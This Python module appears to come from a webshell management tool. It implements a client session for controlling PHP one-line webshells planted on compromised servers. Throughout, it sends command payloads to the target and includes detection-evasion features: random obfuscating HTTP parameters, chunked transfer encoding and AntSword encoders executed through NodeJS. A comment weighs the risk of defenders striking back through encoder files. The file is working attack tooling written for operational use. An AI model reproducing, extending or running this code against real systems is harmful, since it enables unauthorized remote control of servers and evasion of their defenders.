from urllib.parse import urlencode
import json
import random
import shutil
import typing as t


import httpx

from .. import exceptions

from ...utils import random_english_words, random_data, const
from ...utils.nodejs_bridge import nodejs_eval
from ..base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)
from ..php import PHPWebshell, php_webshell_conn_options

# 为了执行蚁剑encoder，我们在发送请求时读取对应的文件传给NodeJS执行
# 此时只要蓝队可以写文件就可以利用encoder实现RCE
# 但是为了实现动态加载encoder没有其他方法规避这个风险
# 为了减缓风险，我们提前读取所有的encoder
# 这样至少可以避免游魂启动后被反制

antsword_encoders = {
    file.name: file.read_text() for file in const.ANTSWORD_ENCODER_FOLDER.glob("*.js")
}


def get_obfs_data(exclude_keys: t.Iterable[str]):
    excludes = set(exclude_keys)
    while True:
        obfs_data = {
            random_english_words(): random_data() for _ in range(random.randint(8, 12))
        }
        if all(k not in obfs_data for k in excludes):
            return obfs_data


def user_json_loads(data: str, types: t.Union[type, t.Iterable[type]]):
    if not isinstance(types, type):
        types = tuple(types)
    try:
        parsed = json.loads(data)
        if not isinstance(parsed, types):
            raise exceptions.UserError(
                f"无效的JSON数据：需要的数据类型为{types}，输入的是{type(parsed)}，数据为{parsed!r}"
            )
        return parsed
    except json.JSONDecodeError as exc:
        raise exceptions.UserError(f"解码JSON失败: {data!r}") from exc


def eval_antsword_encoder(code: str, pwd: str, php_payload: str) -> dict:
    if shutil.which("node") is None:
        raise exceptions.UserError(
            "找不到NodeJS, 无法使用蚁剑Encoder, 请确保程序'node'在对应的环境变量里"
        )
    data = {"_": php_payload}
    code = (
        code.replace("module.exports", "var fn")
        + """
    var pwd = process.argv[2];
    var data = JSON.parse(process.argv[3]);

    console.log(JSON.stringify(fn(pwd, data)))
    """
    )
    return json.loads(nodejs_eval(code, [pwd, json.dumps(data)]))

    # with tempfile.NamedTemporaryFile("w", suffix=".js") as f:
    #     f.write(code)
    #     f.flush()
    #     proc = subprocess.Popen(
    #         ["node", f.name, pwd, json.dumps(data)], stdout=subprocess.PIPE
    #     )
    #     proc.wait()
    #     if proc.returncode != 0:
    #         raise exceptions.ServerError(
    #             f"蚁剑Encoder执行错误，返回值为{proc.returncode}"
    #         )
    #     stdout, _ = proc.communicate()
    #     return json.loads(stdout)


@register_session
class PHPWebshellOneliner(PHPWebshell):
    """一句话的php webshell"""

    session_type = "ONELINE_PHP"
    readable_name = "PHP一句话"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password_method",
                    name="密码请求方法",
                    type="select",
                    placeholder="POST",
                    default_value="POST",
                    alternatives=[
                        {"name": "POST", "value": "POST"},
                        {"name": "GET", "value": "GET"},
                    ],
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value=None,
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="http_params_obfs",
                    name="HTTP参数混淆",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="chunked_request",
                    name="分块传输编码",
                    type="text",
                    placeholder="使用Chunked Transfer encoding分块编码请求，指定分块大小，0表示不分块",
                    default_value="0",
                    alternatives=None,
                ),
                ConnOption(
                    id="antsword_encoder",
                    name="蚁剑Encoder",
                    type="select",
                    placeholder="无",
                    default_value="none",
                    alternatives=[
                        {"name": "无", "value": "none"},
                        *[
                            {"name": filename, "value": filename}
                            for filename in antsword_encoders
                        ],
                    ],
                ),
            ]
            + php_webshell_conn_options,
        },
        {
            "name": "自定义HTTP参数",
            "options": [
                ConnOption(
                    id="http_request_method",
                    name="自定义HTTP请求方法",
                    type="text",
                    placeholder='如"GET"，默认由密码提交方式决定',
                    default_value="",
                    alternatives=None,
                ),
                ConnOption(
                    id="extra_get_params",
                    name="额外的GET参数",
                    type="text",
                    placeholder='保存着额外参数的JSON对象，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                ConnOption(
                    id="extra_post_params",
                    name="额外的POST参数",
                    type="text",
                    placeholder='保存着额外参数的JSON对象，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                ConnOption(
                    id="extra_headers",
                    name="额外的headers",
                    type="text",
                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                ConnOption(
                    id="extra_cookies",
                    name="额外的cookies",
                    type="text",
                    placeholder='保存着额外参数的JSON对象或null，如{"passwd": "123"}',
                    default_value="{}",
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=False,
                    alternatives=None,
                ),
                ConnOption(
                    id="timeout",
                    name="HTTP连接超时",
                    type="text",
                    placeholder="设置超时时间，单位为秒，0表示一直等待",
                    default_value="10.0",
                    alternatives=None,
                ),
            ],
        },
    ]

    def __init__(self, session_conn: dict) -> None:
        super().__init__(session_conn)
        self.password_method = session_conn["password_method"].upper()
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.params = user_json_loads(session_conn.get("extra_get_params", "{}"), dict)
        self.data = user_json_loads(session_conn.get("extra_post_params", "{}"), dict)
        self.headers = user_json_loads(
            session_conn.get("extra_headers", "null"), (dict, type(None))
        )
        self.cookies = user_json_loads(
            session_conn.get("extra_cookies", "null"), (dict, type(None))
        )
        self.http_params_obfs = session_conn["http_params_obfs"]
        self.chunked_request = int(session_conn.get("chunked_request", 0))
        self.https_verify = session_conn.get("https_verify", False)
        self.timeout = float(session_conn.get("timeout", 0))

        self.method = self.password_method
        if session_conn.get("http_request_method", ""):
            self.method = session_conn["http_request_method"].strip().upper()

        if self.chunked_request and self.password_method != "POST":
            raise exceptions.UserError(
                "使用Chunked Transfer Encoding时请求方法必须为POST"
            )

        self.antsword_encoder: t.Union[str, None]
        if session_conn.get("antsword_encoder", "none") == "none":
            self.antsword_encoder = None
        else:
            encoder = session_conn.get("antsword_encoder", "none")
            if encoder not in antsword_encoders:
                raise exceptions.UserError("未找到蚁剑Encoder: " + encoder)
            self.antsword_encoder = antsword_encoders[encoder]

        if self.antsword_encoder and self.password_method != "POST":
            raise exceptions.UserError("在使用蚁剑Encoder时密码提交方法必须为POST！")

        if self.antsword_encoder and self.method != "POST":
            raise exceptions.UserError("在使用蚁剑Encoder时HTTP请求方法必须为POST！")

        if not self.timeout:
            self.timeout = None
        self.client = get_http_client(verify=self.https_verify)

    def build_chunked_request(self, params: dict, data: dict):
        data_bytes = urlencode(data).encode()

        async def yield_data():
            for i in range(0, len(data_bytes), self.chunked_request):
                yield data_bytes[i : i + self.chunked_request]

        return self.client.build_request(
            method=self.method,
            url=self.url,
            params=params,
            # data=data,
            content=yield_data(),
            headers={
                **self.headers,
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            cookies=self.cookies,
            timeout=self.timeout,
        )

    def build_normal_request(self, params: dict, data: dict):
        return self.client.build_request(
            method=self.method,
            url=self.url,
            params=params,
            data=data,
            headers=self.headers,
            cookies=self.cookies,
            timeout=self.timeout,
        )

    async def submit_raw(self, payload: str) -> t.Tuple[int, str]:
        params = self.params.copy()
        data = self.data.copy()
        if self.antsword_encoder:
            data = eval_antsword_encoder(self.antsword_encoder, self.password, payload)
        elif self.password_method == "GET":
            params[self.password] = payload
            if self.http_params_obfs:
                params.update(get_obfs_data(params.keys()))
        else:
            data[self.password] = payload
            if self.http_params_obfs:
                data.update(get_obfs_data(data.keys()))
        try:
            request = (
                self.build_normal_request(params, data)
                if self.chunked_request == 0
                else self.build_chunked_request(params, data)
            )
            response = await self.client.send(request)
            return response.status_code, response.text

        except httpx.TimeoutException as exc:
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
